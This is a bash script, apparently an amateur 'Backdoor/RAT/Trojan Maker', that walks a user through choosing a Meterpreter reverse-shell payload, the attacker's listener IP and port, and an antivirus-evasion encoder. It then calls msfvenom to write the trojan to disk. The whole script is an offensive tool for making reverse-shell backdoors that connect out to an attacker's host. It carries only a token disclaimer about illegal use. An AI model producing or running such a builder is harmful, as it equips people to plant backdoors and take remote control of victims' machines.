#! /bin/bash

bold=`echo -en "\e[1m"`
 underline=`echo -en "\e[4m"`
 dim=`echo -en "\e[2m"`
 strickthrough=`echo -en "\e[9m"`
 blink=`echo -en "\e[5m"`
 reverse=`echo -en "\e[7m"`
 hidden=`echo -en "\e[8m"`
 normal=`echo -en "\e[0m"`
 black=`echo -en "\e[30m"`
 red=`echo -en "\e[31m"`
 green=`echo -en "\e[32m"`
 orange=`echo -en "\e[33m"`
 blue=`echo -en "\e[34m"`
 purple=`echo -en "\e[35m"`
 aqua=`echo -en "\e[36m"`
 gray=`echo -en "\e[37m"`
 darkgray=`echo -en "\e[90m"`
 lightred=`echo -en "\e[91m"`
 lightgreen=`echo -en "\e[92m"`
 lightyellow=`echo -en "\e[93m"`
 lightblue=`echo -en "\e[94m"`
 lightpurple=`echo -en "\e[95m"`
 lightaqua=`echo -en "\e[96m"`
 white=`echo -en "\e[97m"`
 default=`echo -en "\e[39m"`
 BLACK=`echo -en "\e[40m"`
 RED=`echo -en "\e[41m"`
 GREEN=`echo -en "\e[42m"`
 ORANGE=`echo -en "\e[43m"`
 BLUE=`echo -en "\e[44m"`
 PURPLE=`echo -en "\e[45m"`
 AQUA=`echo -en "\e[46m"`
 GRAY=`echo -en "\e[47m"`
 DARKGRAY=`echo -en "\e[100m"`
 LIGHTRED=`echo -en "\e[101m"`
 LIGHTGREEN=`echo -en "\e[102m"`
 LIGHTYELLOW=`echo -en "\e[103m"`
 LIGHTBLUE=`echo -en "\e[104m"`
 LIGHTPURPLE=`echo -en "\e[105m"`
 LIGHTAQUA=`echo -en "\e[106m"`
 WHITE=`echo -en "\e[107m"`
 DEFAULT=`echo -en "\e[49m"`
 
clear

echo "${normal}                       |\_/|"
echo '                       (O.o)'
echo '                       (> <)'
echo  
echo '              Im here to watch over you!' 
echo 
echo ============================ Hi. ========================================
echo Backdoor/RAT/Trojan Maker For Linux/Debian/Ubuntu
echo Written by: Ghosty/DeaDHackS 
echo Important: Make sure you have installed MSFvenom.
echo Do not try to use this script for illegal activities im not the cause of it!
echo ===========================================================================
echo NOTE: This script might be a bit advance for beginners...
echo Please read HowTo that is given with the script to see how to use it!
echo ===========================================================================
echo Lets setup and make our backdoor!
echo What type of backdoor do you need?
echo Choose by name:
echo [1]. linux/x86/meterpreter_reverse_tcp MOST USED / RECOMMENDED FOR BEGINNERS
echo [2]. linux/x86/meterpreter_reverse_https MOST SECURE
echo [3]. linux/x86/meterpreter_reverse_http
read typebackdoor
echo Right sir! Setting up the payload type!
echo Backdoor Type = $typebackdoor 
echo ============================================================================
echo Do ifconfig in a terminal to see your local IP Address or go on google/firefox and type my ip to see your private IP address
echo Your local/Private IP address?:
read ip
echo Setting up the ip...DONE!
echo IP = $ip
echo ============================================================================
echo Depends your backdoor type.. just see at the end if its tcp, http, https.
echo We Recommend:
echo 'HTTPS & HTTP: 80/443'
echo 'TCP: 80/443/4444'
echo Or simply put a custom one...
echo Choose what port to listen on:
read port
echo Setting up the port...DONE! 
echo Port = $port
echo ==============================================================================
echo searching avaible encoder for $typebackdoor ...
echo Platform = Linux
echo Type = x86
echo Searching ...
echo ...
echo ...
echo ...
echo Succesfully found 4 encoders!!
echo ==============================================================================
echo What encoder do you wish to use?:
echo Choose by name:
echo [1]. x86/shikata_ga_nai MOST USED/POWERFULL/RECOMMENDED
echo [2]. generic/none
echo [3]. x86/call4_dword_xor 
echo [4]. x86/countdown
echo [5]. enter for none 
read encoder 
echo Building shell encryptions $encoder...
echo DONE!
echo Setting up encoder...DONE!
echo Encoder = $encoder 
echo ==============================================================================
echo Format = .exe
echo Setting up format...DONE!
echo Format = .exe
echo ==============================================================================
echo What name you wanna to use?:
read name
echo Setting up name...DONE!
echo Name = $name
echo ==============================================================================
echo Platform: Linux
echo Format: exe
echo Backdoor: $typebackdoor
echo IP: $ip	
echo Port: $port
echo Encoder: $encoder
echo Name: $name
echo Path: /root/Desktop/
echo ==============================================================================
echo Creating shell codes ....
echo Getting encoder
echo            '|\_/|'
echo            '(O.o)'
echo            '(> <) Use my RATs well please... i didnt make them for nothing....'
echo               Take care of $name ...

msfvenom -a x86 --platform linux -p $typebackdoor LHOST=$ip LPORT=$port --encoder $encoder x > /root/Desktop/$name
